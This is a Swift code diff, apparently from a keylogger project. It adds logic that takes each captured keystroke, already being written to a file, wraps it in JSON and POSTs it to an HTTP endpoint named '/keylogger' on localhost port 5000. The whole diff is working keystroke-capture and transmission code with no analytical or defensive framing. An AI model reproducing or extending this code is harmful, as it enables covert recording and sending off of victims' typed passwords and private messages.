@@ -149,6 +149,34 @@ Outside:if pressed == 1
             else
             {
                 fh?.write(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
+                    
+                // prepare json data
+                let json: [String: Any] = ["input": mySelf.keyMap[scancode]![0]]
+                print(json)
+                let jsonData = try? JSONSerialization.data(withJSONObject: json, options: .prettyPrinted)
+                // create post request
+                let url = URL(string: "http://localhost:5000/keylogger")!
+                var request = URLRequest(url: url)
+                request.httpMethod = "POST"
+                
+                // insert json data to the request
+                request.httpBody = jsonData
+                //HTTP Headers
+                request.addValue("application/json", forHTTPHeaderField: "Content-Type")
+                request.addValue("application/json", forHTTPHeaderField: "Accept")
+            
+                let task = URLSession.shared.dataTask(with: request) { data, response, error in
+                    guard let data = data, error == nil else {
+                        print(error?.localizedDescription ?? "No data")
+                        return
+                    }
+                    let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
+                    if let responseJSON = responseJSON as? [String: Any] {
+                        print(responseJSON)
+                    }
+                }
+                
+                task.resume()
             }
         }
         else
